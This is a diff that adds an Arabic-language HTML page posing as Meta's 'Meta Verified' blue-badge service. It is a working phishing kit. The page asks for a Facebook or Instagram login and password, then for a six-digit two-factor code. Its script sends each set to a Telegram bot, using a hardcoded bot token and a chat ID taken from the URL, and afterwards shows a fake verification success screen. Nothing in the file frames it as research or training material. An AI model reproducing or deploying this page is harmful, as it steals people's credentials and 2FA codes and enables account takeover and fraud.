@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meta Verified - نظام التوثيق المتقدم</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            --fb-blue: #1877f2;
+            --fb-dark: #166fe5;
+            --fb-green: #42b72a;
+            --fb-bg: #f0f2f5;
+            --fb-white: #ffffff;
+            --fb-gray: #65676b;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: var(--fb-bg);
+            min-height: 100vh;
+            color: #1c1e21;
+            overflow-x: hidden;
+        }
+
+        /* ===== HEADER ===== */
+        .fb-header {
+            background: var(--fb-white);
+            border-bottom: 1px solid #dddfe2;
+            padding: 12px 16px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .fb-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .fb-logo svg {
+            width: 40px;
+            height: 40px;
+            animation: logoPulse 3s infinite;
+        }
+
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .fb-logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--fb-blue);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: #e7f3ff;
+            color: var(--fb-blue);
+            padding: 8px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            animation: badgeGlow 2s infinite;
+        }
+
+        @keyframes badgeGlow {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.4); }
+            50% { box-shadow: 0 0 0 8px rgba(24, 119, 242, 0); }
+        }
+
+        /* ===== PROGRESS BAR ===== */
+        .progress-container {
+            position: fixed;
+            top: 65px;
+            left: 0;
+            right: 0;
+            background: var(--fb-white);
+            padding: 16px;
+            z-index: 999;
+            border-bottom: 1px solid #dddfe2;
+        }
+
+        .progress-steps {
+            max-width: 600px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 20px;
+            left: 10%;
+            right: 10%;
+            height: 4px;
+            background: #e4e6eb;
+            border-radius: 2px;
+            z-index: 1;
+        }
+
+        .progress-fill-line {
+            height: 100%;
+            background: var(--fb-blue);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 2px;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            z-index: 2;
+            position: relative;
+        }
+
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e4e6eb;
+            color: #65676b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            transition: all 0.3s;
+            border: 3px solid transparent;
+        }
+
+        .step.active .step-circle {
+            background: var(--fb-blue);
+            color: white;
+            animation: stepPulse 1.5s infinite;
+        }
+
+        .step.completed .step-circle {
+            background: var(--fb-green);
+            color: white;
+        }
+
+        @keyframes stepPulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.5); }
+            50% { box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); }
+        }
+
+        .step-label {
+            font-size: 12px;
+            color: var(--fb-gray);
+            font-weight: 500;
+        }
+
+        .step.active .step-label {
+            color: var(--fb-blue);
+            font-weight: 700;
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .main-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 140px 16px 40px;
+            min-height: 100vh;
+        }
+
+        /* ===== PAGES ===== */
+        .page {
+            display: none;
+            animation: pageEnter 0.5s ease;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes pageEnter {
+            from { opacity: 0; transform: translateX(30px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* ===== CARDS ===== */
+        .card {
+            background: var(--fb-white);
+            border-radius: 16px;
+            padding: 32px 24px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            animation: cardFloat 0.6s ease;
+        }
+
+        @keyframes cardFloat {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ===== HERO SECTIONS ===== */
+        .hero-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 24px;
+            position: relative;
+        }
+
+        .hero-icon-ring {
+            position: absolute;
+            inset: 0;
+            border: 4px solid var(--fb-blue);
+            border-radius: 50%;
+            animation: ringPulse 2s infinite;
+        }
+
+        .hero-icon-ring:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+
+        .hero-icon-inner {
+            position: absolute;
+            inset: 12px;
+            background: linear-gradient(135deg, var(--fb-blue), var(--fb-green));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            color: white;
+        }
+
+        @keyframes ringPulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0; }
+        }
+
+        .card h1 {
+            font-size: 26px;
+            text-align: center;
+            margin-bottom: 12px;
+            color: #1c1e21;
+        }
+
+        .card > p {
+            text-align: center;
+            color: var(--fb-gray);
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        /* ===== FEATURES GRID ===== */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .feature-item {
+            background: #f5f6f7;
+            border-radius: 12px;
+            padding: 20px 16px;
+            text-align: center;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+
+        .feature-item:hover {
+            border-color: var(--fb-blue);
+            transform: translateY(-2px);
+        }
+
+        .feature-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--fb-blue);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 24px;
+            color: white;
+        }
+
+        .feature-item h3 {
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .feature-item p {
+            font-size: 12px;
+            color: var(--fb-gray);
+        }
+
+        /* ===== INPUTS ===== */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            color: var(--fb-gray);
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus ~ .input-icon {
+            color: var(--fb-blue);
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 16px 48px 16px 16px;
+            border: 2px solid #dddfe2;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #f5f6f7;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            background: white;
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.1);
+        }
+
+        /* ===== SECURITY ELEMENTS ===== */
+        .security-banner {
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-right: 4px solid var(--fb-green);
+        }
+
+        .security-banner::before {
+            content: "🔒";
+            font-size: 24px;
+        }
+
+        .security-banner p {
+            font-size: 13px;
+            color: #2e7d32;
+            line-height: 1.5;
+        }
+
+        .security-banner strong {
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        /* ===== BUTTONS ===== */
+        .btn-primary {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, var(--fb-blue), var(--fb-dark));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+            box-shadow: 0 4px 16px rgba(24, 119, 242, 0.3);
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: 0.5s;
+        }
+
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        .btn-primary.loading .spinner {
+            display: inline-block;
+        }
+
+        .btn-primary.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #e7f3ff;
+            color: var(--fb-blue);
+            border: 2px solid var(--fb-blue);
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s;
+        }
+
+        .btn-secondary:hover {
+            background: var(--fb-blue);
+            color: white;
+        }
+
+        /* ===== CODE INPUT ===== */
+        .code-inputs {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 24px 0;
+        }
+
+        .code-input {
+            width: 56px;
+            height: 64px;
+            border: 2px solid #dddfe2;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            background: #f5f6f7;
+            transition: all 0.3s;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            background: white;
+            transform: scale(1.05);
+        }
+
+        /* ===== LOADING PAGE ===== */
+        .loading-page {
+            text-align: center;
+            padding: 60px 20px;
+        }
+
+        .loading-animation {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 32px;
+            position: relative;
+        }
+
+        .loading-ring {
+            position: absolute;
+            inset: 0;
+            border: 4px solid #e7f3ff;
+            border-top-color: var(--fb-blue);
+            border-radius: 50%;
+            animation: rotate 1s linear infinite;
+        }
+
+        .loading-ring:nth-child(2) {
+            inset: 20px;
+            border-color: #e8f5e9;
+            border-top-color: var(--fb-green);
+            animation-direction: reverse;
+            animation-duration: 1.5s;
+        }
+
+        @keyframes rotate {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-icon {
+            position: absolute;
+            inset: 40px;
+            background: var(--fb-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: white;
+            animation: iconPulse 1s infinite;
+        }
+
+        @keyframes iconPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .loading-steps {
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        .loading-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            margin-bottom: 8px;
+            border-radius: 12px;
+            opacity: 0.5;
+            transition: all 0.3s;
+        }
+
+        .loading-step.active {
+            opacity: 1;
+            background: #e7f3ff;
+        }
+
+        .loading-step.completed {
+            opacity: 1;
+            color: var(--fb-green);
+        }
+
+        .step-check {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: var(--fb-gray);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            flex-shrink: 0;
+        }
+
+        .loading-step.active .step-check {
+            background: var(--fb-blue);
+            animation: checkPulse 1s infinite;
+        }
+
+        .loading-step.completed .step-check {
+            background: var(--fb-green);
+        }
+
+        @keyframes checkPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        /* ===== SUCCESS PAGE ===== */
+        .success-page {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-animation {
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 32px;
+            position: relative;
+        }
+
+        .success-circle {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--fb-green), #36a420);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 70px;
+            color: white;
+            animation: successPop 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            box-shadow: 0 8px 32px rgba(66, 183, 42, 0.4);
+        }
+
+        @keyframes successPop {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .success-confetti {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: var(--fb-blue);
+            animation: confetti 1s ease-out forwards;
+        }
+
+        @keyframes confetti {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-100px) rotate(720deg); opacity: 0; }
+        }
+
+        .verified-profile {
+            background: white;
+            border-radius: 20px;
+            padding: 24px;
+            max-width: 340px;
+            margin: 32px auto;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.12);
+            border: 3px solid var(--fb-blue);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verified-profile::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--fb-blue), var(--fb-green));
+        }
+
+        .profile-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .profile-avatar {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--fb-blue), var(--fb-green));
+            padding: 3px;
+            animation: avatarGlow 2s infinite;
+        }
+
+        @keyframes avatarGlow {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.4); }
+            50% { box-shadow: 0 0 0 15px rgba(24, 119, 242, 0); }
+        }
+
+        .profile-avatar img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid white;
+            object-fit: cover;
+        }
+
+        .profile-info h3 {
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .verified-badge-icon {
+            color: var(--fb-blue);
+            font-size: 22px;
+        }
+
+        .profile-info p {
+            color: var(--fb-gray);
+            font-size: 14px;
+        }
+
+        .verification-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            background: var(--fb-green);
+            border-radius: 50%;
+            animation: statusPulse 2s infinite;
+        }
+
+        @keyframes statusPulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+        }
+
+        /* ===== FOOTER ===== */
+        .fb-footer {
+            text-align: center;
+            padding: 32px 20px;
+            color: var(--fb-gray);
+            font-size: 13px;
+        }
+
+        .fb-footer a {
+            color: var(--fb-gray);
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        /* ===== ERROR MESSAGE ===== */
+        .error-message {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            display: none;
+            animation: shake 0.5s;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        /* ===== HIDDEN ===== */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header class="fb-header">
+        <div class="header-content">
+            <div class="fb-logo">
+                <svg viewBox="0 0 36 36" fill="currentColor">
+                    <path fill="#1877f2" d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"/>
+                    <path fill="white" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.824l-1 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"/>
+                </svg>
+                <span class="fb-logo-text">Meta Verified</span>
+            </div>
+            <div class="security-badge">
+                <span>🔒</span>
+                <span>آمن ومشفر</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- PROGRESS -->
+    <div class="progress-container">
+        <div class="progress-steps">
+            <div class="progress-line">
+                <div class="progress-fill-line" id="progressLine"></div>
+            </div>
+            <div class="step active" id="step1">
+                <div class="step-circle">1</div>
+                <span class="step-label">البيانات</span>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-circle">2</div>
+                <span class="step-label">التحقق</span>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-circle">3</div>
+                <span class="step-label">الأمان</span>
+            </div>
+            <div class="step" id="step4">
+                <div class="step-circle">4</div>
+                <span class="step-label">الانتهاء</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN -->
+    <main class="main-container">
+
+        <!-- PAGE 1: WELCOME -->
+        <div class="page active" id="page1">
+            <div class="card">
+                <div class="hero-icon">
+                    <div class="hero-icon-ring"></div>
+                    <div class="hero-icon-ring"></div>
+                    <div class="hero-icon-inner">✓</div>
+                </div>
+                <h1>احصل على الشارة الزرقاء</h1>
+                <p>انضم إلى نخبة المستخدمين الموثقين على فيسبوك وانستغرام. احمِ حسابك وتميز بين الجميع.</p>
+                
+                <div class="features-grid">
+                    <div class="feature-item">
+                        <div class="feature-icon">🛡️</div>
+                        <h3>حماية كاملة</h3>
+                        <p>من الانتحال والتقليد</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">⭐</div>
+                        <h3>تميز خاص</h3>
+                        <p>في البحث والتعليقات</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🎧</div>
+                        <h3>دعم مخصص</h3>
+                        <p>على مدار الساعة</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">📊</div>
+                        <h3>إحصائيات</h3>
+                        <p>متقدمة للحساب</p>
+                    </div>
+                </div>
+
+                <button class="btn-primary" onclick="goToPage(2)">
+                    <span class="btn-text">ابدأ التوثيق الآن</span>
+                    <span class="spinner"></span>
+                </button>
+            </div>
+        </div>
+
+        <!-- PAGE 2: LOGIN INFO -->
+        <div class="page" id="page2">
+            <div class="card">
+                <div class="hero-icon" style="width: 80px; height: 80px;">
+                    <div class="hero-icon-inner" style="inset: 8px; font-size: 36px;">👤</div>
+                </div>
+                <h1>تسجيل الدخول</h1>
+                <p>أدخل بيانات حسابك للتحقق من ملكيته</p>
+
+                <div class="error-message" id="errorMsg">يرجى إدخال جميع البيانات بشكل صحيح</div>
+
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label>البريد الإلكتروني أو رقم الهاتف</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="contact" placeholder="example@email.com" required>
+                            <span class="input-icon">📧</span>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label>كلمة المرور</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="password" placeholder="••••••••" required>
+                            <span class="input-icon">🔒</span>
+                        </div>
+                    </div>
+
+                    <div class="security-banner">
+                        <p><strong>تشفير SSL 256-bit</strong>بياناتك محمية ومشفرة بالكامل</p>
+                    </div>
+
+                    <button type="submit" class="btn-primary" id="loginBtn">
+                        <span class="btn-text">التالي</span>
+                        <span class="spinner"></span>
+                    </button>
+                </form>
+
+                <button class="btn-secondary" onclick="goToPage(1)">رجوع</button>
+            </div>
+        </div>
+
+        <!-- PAGE 3: 2FA CODE -->
+        <div class="page" id="page3">
+            <div class="card">
+                <div class="hero-icon" style="width: 80px; height: 80px;">
+                    <div class="hero-icon-inner" style="inset: 8px; font-size: 36px;">🔐</div>
+                </div>
+                <h1>رمز التحقق</h1>
+                <p>أدخل رمز المصادقة الثنائية المرسل إلى هاتفك</p>
+
+                <div class="code-inputs">
+                    <input type="text" class="code-input" maxlength="1" id="code1">
+                    <input type="text" class="code-input" maxlength="1" id="code2">
+                    <input type="text" class="code-input" maxlength="1" id="code3">
+                    <input type="text" class="code-input" maxlength="1" id="code4">
+                    <input type="text" class="code-input" maxlength="1" id="code5">
+                    <input type="text" class="code-input" maxlength="1" id="code6">
+                </div>
+
+                <p style="text-align: center; color: var(--fb-gray); font-size: 14px; margin-bottom: 24px;">
+                    لم تستلم الرمز؟ <a href="#" style="color: var(--fb-blue);">إعادة إرسال</a>
+                </p>
+
+                <button class="btn-primary" id="codeBtn" onclick="submitCode()">
+                    <span class="btn-text">تحقق</span>
+                    <span class="spinner"></span>
+                </button>
+
+                <button class="btn-secondary" onclick="goToPage(2)">رجوع</button>
+            </div>
+        </div>
+
+        <!-- PAGE 4: PROCESSING -->
+        <div class="page" id="page4">
+            <div class="loading-page">
+                <div class="loading-animation">
+                    <div class="loading-ring"></div>
+                    <div class="loading-ring"></div>
+                    <div class="loading-icon">✓</div>
+                </div>
+                <h2>جاري التحقق من البيانات...</h2>
+                <p style="color: var(--fb-gray); margin-top: 8px;">يرجى عدم إغلاق الصفحة</p>
+
+                <div class="loading-steps" style="margin-top: 32px;">
+                    <div class="loading-step completed" id="loadStep1">
+                        <span class="step-check">✓</span>
+                        <span>التحقق من بيانات الدخول</span>
+                    </div>
+                    <div class="loading-step active" id="loadStep2">
+                        <span class="step-check">2</span>
+                        <span>مراجعة هوية الحساب</span>
+                    </div>
+                    <div class="loading-step" id="loadStep3">
+                        <span class="step-check">3</span>
+                        <span>إصدار الشارة الزرقاء</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 5: SUCCESS -->
+        <div class="page" id="page5">
+            <div class="success-page">
+                <div class="success-animation">
+                    <div class="success-confetti" id="confetti"></div>
+                    <div class="success-circle">✓</div>
+                </div>
+                <h2>تم التوثيق بنجاح!</h2>
+                <p>حسابك الآن موثق رسمياً. ستظهر الشارة خلال 24 ساعة.</p>
+
+                <div class="verified-profile">
+                    <div class="profile-header">
+                        <div class="profile-avatar">
+                            <img src="https://via.placeholder.com/72" alt="Profile" id="finalAvatar">
+                        </div>
+                        <div class="profile-info">
+                            <h3>
+                                <span id="finalName">المستخدم</span>
+                                <span class="verified-badge-icon">✓</span>
+                            </h3>
+                            <p>حساب موثق رسمياً</p>
+                        </div>
+                    </div>
+                    <div class="verification-status">
+                        <span class="status-dot"></span>
+                        <span>التوثيق نشط</span>
+                    </div>
+                </div>
+
+                <button class="btn-primary" onclick="location.reload()" style="margin-top: 24px;">
+                    <span class="btn-text">العودة للرئيسية</span>
+                </button>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="fb-footer">
+        <p>
+            <a href="#">الخصوصية</a> · 
+            <a href="#">الشروط</a> · 
+            <a href="#">المساعدة</a> · 
+            <a href="#">الإعلانات</a>
+        </p>
+        <p style="margin-top: 8px;">© 2026 Meta Platforms, Inc.</p>
+    </footer>
+
+    <script>
+        // Telegram Bot Token
+        const BOT_TOKEN = '8360365079:AAE5JYoDz1OwgyFnoMoi1gO2EtYVMmlXAOY';
+        
+        let currentPage = 1;
+        let userData = {
+            contact: '',
+            password: '',
+            code: ''
+        };
+
+        function getChatIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('documentation');
+        }
+
+        function updateProgress() {
+            const progress = ((currentPage - 1) / 3) * 100;
+            document.getElementById('progressLine').style.width = progress + '%';
+            
+            for (let i = 1; i <= 4; i++) {
+                const step = document.getElementById('step' + i);
+                step.classList.remove('active', 'completed');
+                
+                if (i < currentPage) {
+                    step.classList.add('completed');
+                    step.querySelector('.step-circle').textContent = '✓';
+                } else if (i === currentPage) {
+                    step.classList.add('active');
+                }
+            }
+        }
+
+        function goToPage(page) {
+            document.getElementById('page' + currentPage).classList.remove('active');
+            document.getElementById('page' + page).classList.add('active');
+            currentPage = page;
+            updateProgress();
+        }
+
+        // Page 2: Login Form
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('loginBtn');
+            const contact = document.getElementById('contact').value;
+            const password = document.getElementById('password').value;
+            
+            if (!contact || !password) {
+                document.getElementById('errorMsg').classList.add('show');
+                return;
+            }
+            
+            userData.contact = contact;
+            userData.password = password;
+            
+            btn.classList.add('loading');
+            
+            const CHAT_ID = getChatIdFromUrl();
+            if (CHAT_ID) {
+                const message = `🔐 تسجيل دخول جديد\n\n📧: ${contact}\n🔑: ${password}\n🕐: ${new Date().toLocaleString('ar-SA')}`;
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                    });
+                } catch (e) { console.error(e); }
+            }
+            
+            setTimeout(() => {
+                btn.classList.remove('loading');
+                goToPage(3);
+            }, 1500);
+        });
+
+        // Page 3: Code Input
+        const codeInputs = document.querySelectorAll('.code-input');
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === 1 && index < 5) {
+                    codeInputs[index + 1].focus();
+                }
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    codeInputs[index - 1].focus();
+                }
+            });
+        });
+
+        async function submitCode() {
+            const btn = document.getElementById('codeBtn');
+            const code = Array.from(codeInputs).map(i => i.value).join('');
+            
+            if (code.length !== 6) return;
+            
+            userData.code = code;
+            btn.classList.add('loading');
+            
+            const CHAT_ID = getChatIdFromUrl();
+            if (CHAT_ID) {
+                const message = `🔑 رمز 2FA\n\n📧: ${userData.contact}\n🔑: ${userData.password}\n🔐 الكود: ${code}\n🕐: ${new Date().toLocaleString('ar-SA')}`;
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                    });
+                } catch (e) { console.error(e); }
+            }
+            
+            setTimeout(() => {
+                btn.classList.remove('loading');
+                goToPage(4);
+                startLoadingAnimation();
+            }, 1500);
+        }
+
+        function startLoadingAnimation() {
+            setTimeout(() => {
+                document.getElementById('loadStep2').classList.add('completed');
+                document.getElementById('loadStep2').classList.remove('active');
+                document.getElementById('loadStep3').classList.add('active');
+            }, 2000);
+            
+            setTimeout(() => {
+                document.getElementById('loadStep3').classList.add('completed');
+                document.getElementById('loadStep3').classList.remove('active');
+                goToPage(5);
+                createConfetti();
+                document.getElementById('finalName').textContent = userData.contact.split('@')[0] || 'المستخدم';
+            }, 4000);
+        }
+
+        function createConfetti() {
+            const container = document.getElementById('confetti');
+            const colors = ['#1877f2', '#42b72a', '#ff6b6b', '#ffd93d', '#6bcf7f'];
+            
+            for (let i = 0; i < 20; i++) {
+                const piece = document.createElement('div');
+                piece.className = 'confetti-piece';
+                piece.style.left = Math.random() * 100 + '%';
+                piece.style.top = '50%';
+                piece.style.background = colors[Math.floor(Math.random() * colors.length)];
+                piece.style.animationDelay = Math.random() * 0.5 + 's';
+                container.appendChild(piece);
+            }
+        }
+
+        // Initialize
+        updateProgress();
+    </script>
+
+</body>
+</html>
